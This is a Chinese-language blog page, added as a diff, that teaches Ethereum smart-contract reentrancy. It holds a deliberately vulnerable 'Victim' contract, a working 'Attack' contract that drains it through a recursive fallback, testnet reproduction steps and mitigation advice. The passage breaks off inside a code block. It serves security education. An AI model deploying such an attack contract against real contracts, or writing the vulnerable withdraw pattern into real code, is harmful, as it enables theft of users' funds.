@@ -1,0 +1,727 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="文章首发：奇安信攻防社区 重⼊攻击，可能是最着名的以太坊漏洞。合约在开发过程中，使用了危险的函数，并且使用不安全的交互模式。两者叠加在一起造就了以太坊非常经典的重入漏洞。其中最有代表性的攻击是 The DAO 原理分析外部恶意合约回调了受攻击合约上的一个函数，并在受攻击合约上的任意位置“重新进入”代码执行。因为原合约的程序员可能没有预料到合约代码可以被”重入“，因此合约会出现不可预知的行为。在 g">
+<meta property="og:type" content="article">
+<meta property="og:title" content="智能合约重入漏洞">
+<meta property="og:url" content="http://example.com/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="文章首发：奇安信攻防社区 重⼊攻击，可能是最着名的以太坊漏洞。合约在开发过程中，使用了危险的函数，并且使用不安全的交互模式。两者叠加在一起造就了以太坊非常经典的重入漏洞。其中最有代表性的攻击是 The DAO 原理分析外部恶意合约回调了受攻击合约上的一个函数，并在受攻击合约上的任意位置“重新进入”代码执行。因为原合约的程序员可能没有预料到合约代码可以被”重入“，因此合约会出现不可预知的行为。在 g">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211025202430311.png">
+<meta property="og:image" content="http://example.com/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111011420.png">
+<meta property="og:image" content="http://example.com/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111204753.png">
+<meta property="og:image" content="http://example.com/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111231368.png">
+<meta property="og:image" content="http://example.com/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111416824.png">
+<meta property="og:image" content="http://example.com/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111626852.png">
+<meta property="og:image" content="http://example.com/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111639557.png">
+<meta property="og:image" content="http://example.com/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030143200282.png">
+<meta property="og:image" content="http://example.com/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030143902046.png">
+<meta property="og:image" content="http://example.com/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030144202275.png">
+<meta property="og:image" content="http://example.com/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030151853031.png">
+<meta property="og:image" content="http://example.com/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030152110108.png">
+<meta property="og:image" content="http://example.com/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030152151377.png">
+<meta property="og:image" content="http://example.com/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030152237814.png">
+<meta property="og:image" content="http://example.com/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211110234242078.png">
+<meta property="article:published_time" content="2021-11-09T14:23:21.000Z">
+<meta property="article:modified_time" content="2022-08-15T13:31:12.924Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="漏洞">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211025202430311.png">
+  
+  
+  
+  <title>智能合约重入漏洞 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="智能合约重入漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-11-09 22:23" pubdate>
+          November 9, 2021 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.5k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          72 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">智能合约重入漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>文章首发：<a target="_blank" rel="noopener" href="https://forum.butian.net/share/878">奇安信攻防社区</a></p>
+<p>重⼊攻击，可能是最着名的以太坊漏洞。合约在开发过程中，使用了危险的函数，并且使用不安全的交互模式。两者叠加在一起造就了以太坊非常经典的重入漏洞。其中最有代表性的攻击是 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/The_DAO_(organization)">The DAO</a></p>
+<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>外部恶意合约回调了受攻击合约上的一个函数，并在受攻击合约上的任意位置“重新进入”代码执行。因为原合约的程序员可能没有预料到合约代码可以被”重入“，因此合约会出现不可预知的行为。在 gas 足够的情况下，合约之间甚至可以相互循环调用，直至达到 gas 的上限，但是如果循环中有转账之类的操作，就会导致严重的后果。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function withdraw(uint _amount) public &#123;<br>	require(balances[msg.sender] &gt;= _amount)<br>	msg.sender.call.value(_amount)();<br>	balances[msg.sender] -= _amount;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211025202430311.png" srcset="/img/loading.gif" lazyload alt="image-20211025202430311"></p>
+<p>其中，<code>fallback</code>函数是关键</p>
+<h3 id="fallback函数"><a href="#fallback函数" class="headerlink" title="fallback函数"></a>fallback函数</h3><p>当我们调用某个智能合约时，如果指定的函数找不到，或者根本就没指定调用哪个函数（如向合约发送 ether）时，<code>fallback</code> 函数就会被调用。</p>
+<p>向合约发送 send、transfer、call 消息时候都会调用 <code>fallback</code> 函数，不同的是 send 和 transfer 有 2300 gas 的限制，也就是传递给 <code>fallback</code> 的只有 2300 gas，这个 gas 只能用于记录日志，因为其他操作都将超过 2300 gas。但 call 则会把剩余的所有 gas 都给 <code>fallback</code> 函数，这有可能导致循环调用。</p>
+<p>而<code>fallback</code>函数是可以被重写的</p>
+<p>如果构造一个 <code>fallback</code> 函数，函数里面也调用对方的 <code>withdraw</code> 函数的话，那将会产生一个循环调用转账功能，存在漏洞的合约会不断向攻击者合约转账，终止循环结束（以太坊 gas 有上限）</p>
+<h2 id="漏洞demo"><a href="#漏洞demo" class="headerlink" title="漏洞demo"></a>漏洞demo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.10;<br>contract Victim &#123;<br>	mapping(address =&gt; uint) public balances;<br>	address public owner;<br>    <br>    //构造函数，设定合约所有者<br>    constructor() public &#123;<br>        owner = msg.sender;<br>    &#125;<br>	<br>	//接收资金转入<br>	function deposit() public payable &#123;<br>		balances[msg.sender] += msg.value;<br>	&#125;<br>	<br>	//提款<br>	function withdraw(uint _amount) public &#123;<br>		require(balances[msg.sender] &gt;= _amount);<br>		msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);<br>		balances[msg.sender] -= _amount;<br>	&#125;<br>	<br>	//查询余额<br>	function getBalance() public view returns(uint) &#123;<br>		return address(this).balance;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack &#123;<br>	Victim public victim;<br>	<br>	//设定受害者合约地址<br>	constructor(address _victimAddress) public &#123;<br>		victim = Victim(_victimAddress);<br>	&#125;<br>	<br>	//重写fallback<br>	fallback() external payable &#123;<br>		if(address(victim).balance &gt;= 1 ether)&#123;<br>			victim.withdraw(1 ether);<br>		&#125;<br>	&#125;<br>	<br>	//攻击，调用受害者的withdraw函数<br>	function attack() external payable &#123;<br>		require(msg.value &gt;= 1 ether);<br>		victim.deposit&#123;value: 1 ether&#125;();<br>		victim.withdraw(1 ether);<br>	&#125;<br>	<br>	//查询余额<br>	function getBalance() public view returns(uint) &#123;<br>		return address(this).balance;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="虚拟机中"><a href="#虚拟机中" class="headerlink" title="虚拟机中"></a>虚拟机中</h3><ul>
+<li>分别为受害者和攻击者创建一个合约</li>
+</ul>
+<p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111011420.png" srcset="/img/loading.gif" lazyload alt="image-20211026111011420"></p>
+<ul>
+<li>用deposit函数为受害者设定一定余额</li>
+</ul>
+<p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111204753.png" srcset="/img/loading.gif" lazyload alt="image-20211026111204753"></p>
+<ul>
+<li>检查受害者余额</li>
+</ul>
+<p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111231368.png" srcset="/img/loading.gif" lazyload alt="image-20211026111231368"></p>
+<ul>
+<li>进行攻击</li>
+</ul>
+<p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111416824.png" srcset="/img/loading.gif" lazyload alt="image-20211026111416824"></p>
+<ul>
+<li>检查攻击者和受害者的余额</li>
+</ul>
+<p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111626852.png" srcset="/img/loading.gif" lazyload alt="image-20211026111626852"></p>
+<p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111639557.png" srcset="/img/loading.gif" lazyload alt="image-20211026111639557"></p>
+<h3 id="测试链上"><a href="#测试链上" class="headerlink" title="测试链上"></a>测试链上</h3><ul>
+<li>部署受害者合约</li>
+</ul>
+<p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030143200282.png" srcset="/img/loading.gif" lazyload alt="image-20211030143200282"></p>
+<ul>
+<li><p>部署攻击者合约</p>
+<p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030143902046.png" srcset="/img/loading.gif" lazyload alt="image-20211030143902046"></p>
+</li>
+<li><p>为受害者合约打入2eth</p>
+</li>
+</ul>
+<p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030144202275.png" srcset="/img/loading.gif" lazyload alt="image-20211030144202275"></p>
+<ul>
+<li>攻击</li>
+</ul>
+<p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030151853031.png" srcset="/img/loading.gif" lazyload alt="image-20211030151853031"></p>
+<ul>
+<li>结果</li>
+</ul>
+<p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030152110108.png" srcset="/img/loading.gif" lazyload alt="image-20211030152110108"></p>
+<p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030152151377.png" srcset="/img/loading.gif" lazyload alt="image-20211030152151377"></p>
+<p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030152237814.png" srcset="/img/loading.gif" lazyload alt="image-20211030152237814"></p>
+<h3 id="重入次数"><a href="#重入次数" class="headerlink" title="重入次数"></a>重入次数</h3><p>由于gas的限制，重入次数是有一定限制的</p>
+<p>调整参数，实验出最高重入次数</p>
+<p>可以在区块链浏览器上查询到重入的次数</p>
+<p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211110234242078.png" srcset="/img/loading.gif" lazyload alt="image-20211110234242078"></p>
+<p>大约是9次</p>
+<p>注意，一旦 out of gas 就会攻击失败。</p>
+<p>可以通过使用for循环、用受害者合约的某些状态、用if判断来控制重入次数</p>
+<h2 id="规避建议"><a href="#规避建议" class="headerlink" title="规避建议"></a>规避建议</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>总是用 <code>send()</code>或<code>transfer()</code> 来发送 ether，而不是用 <code>call.value()</code>。因为transfer和send函数的gas仅有2300，这点gas仅够捕获一个event，所以将无法进行可重入攻击。</p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>确保在执行外部调用之前已经更新了所有的内部状态，这一模式被称为：Checks-Effects-Interactions（“检查-生效-交互”）</p>
+<p>第一步，大多数函数会先做一些检查工作（例如谁调用了函数，参数是否在取值范围之内，它们是否发送了足够的以太币Ether ，用户是否具有token等等）。这些检查工作应该首先被完成。</p>
+<p>第二步，如果所有检查都通过了，接下来进行更改合约状态变量的操作。</p>
+<p>第三步，与其它合约的交互应该是任何函数的最后一步。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">require(balances[msg.sender] &gt; amount); //检查<br>require(this.balance &gt; amount); //检查<br>balances[msg.sender] -= amount; // 生效<br>to.call.value(amount)();  // 交互<br></code></pre></td></tr></table></figure>
+
+<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><ol>
+<li>使用互斥锁：添加一个在代码执行过程中锁定合约的状态变量，可防止重入调用</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bool reEntrancyMutex = false;<br>function withdraw(uint _amount) public &#123;<br>	require(!reEntrancyMutex);<br>	reEntrancyMutex = true;<br>	require(balances[msg.sender] &gt;= _amount);<br>	msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);<br>	balances[msg.sender] -= _amount;<br>	reEntrancyMutex = false;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>使用OpenZeppelin官方的<a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol">ReentrancyGuard合约</a>的<code>nonReentrant</code> modifier。</li>
+</ol>
+<p>与互斥锁的思想差不多，但是其官方将其封装成函数修饰词使用。</p>
+<p>在函数中增加<code>nonReentrant</code> modifier可保证其不可重入，任何对该函数的重入操作都将以revert the call的方式来拒绝。</p>
+<p>当合约中有多个函数时，由于modifier的粒度在单个函数，若想完全避免重入，应对每个函数都添加<code>nonReentrant</code> modifier。否则，仍然可以通过其他函数来重入然后发起重入攻击，若该函数可能破坏不变量。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts v4.3.2 (security/ReentrancyGuard.sol)<br><br>pragma solidity ^0.8.0;<br><br>/**<br> * @dev Contract module that helps prevent reentrant calls to a function.<br> *<br> * Inheriting from `ReentrancyGuard` will make the &#123;nonReentrant&#125; modifier<br> * available, which can be applied to functions to make sure there are no nested<br> * (reentrant) calls to them.<br> *<br> * Note that because there is a single `nonReentrant` guard, functions marked as<br> * `nonReentrant` may not call one another. This can be worked around by making<br> * those functions `private`, and then adding `external` `nonReentrant` entry<br> * points to them.<br> *<br> * TIP: If you would like to learn more about reentrancy and alternative ways<br> * to protect against it, check out our blog post<br> * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].<br> */<br>abstract contract ReentrancyGuard &#123;<br>    // Booleans are more expensive than uint256 or any type that takes up a full<br>    // word because each write operation emits an extra SLOAD to first read the<br>    // slot&#x27;s contents, replace the bits taken up by the boolean, and then write<br>    // back. This is the compiler&#x27;s defense against contract upgrades and<br>    // pointer aliasing, and it cannot be disabled.<br><br>    // The values being non-zero value makes deployment a bit more expensive,<br>    // but in exchange the refund on every call to nonReentrant will be lower in<br>    // amount. Since refunds are capped to a percentage of the total<br>    // transaction&#x27;s gas, it is best to keep them low in cases like this one, to<br>    // increase the likelihood of the full refund coming into effect.<br>    uint256 private constant _NOT_ENTERED = 1;<br>    uint256 private constant _ENTERED = 2;<br><br>    uint256 private _status;<br><br>    constructor() &#123;<br>        _status = _NOT_ENTERED;<br>    &#125;<br><br>    /**<br>     * @dev Prevents a contract from calling itself, directly or indirectly.<br>     * Calling a `nonReentrant` function from another `nonReentrant`<br>     * function is not supported. It is possible to prevent this from happening<br>     * by making the `nonReentrant` function external, and making it call a<br>     * `private` function that does the actual work.<br>     */<br>    modifier nonReentrant() &#123;<br>        // On the first call to nonReentrant, _notEntered will be true<br>        require(_status != _ENTERED, &quot;ReentrancyGuard: reentrant call&quot;);<br><br>        // Any calls to nonReentrant after this point will fail<br>        _status = _ENTERED;<br><br>        _;<br><br>        // By storing the original value once again, a refund is triggered (see<br>        // https://eips.ethereum.org/EIPS/eip-2200)<br>        _status = _NOT_ENTERED;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>使用采用pull payment模式，OpenZeppelin提供了<a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/PullPayment.sol">PullPayment合约</a>。</li>
+</ol>
+<p>其提供了<code>_asyncTransfer</code>函数，与<code>transfer</code>类似。然而，它不会将资金发送给接收者，而是将其转移到托管合约中。此外，PullPayment还为接收者提供了一个公共功能来提取（pull）他们的支付：<code>withdrawPayments</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 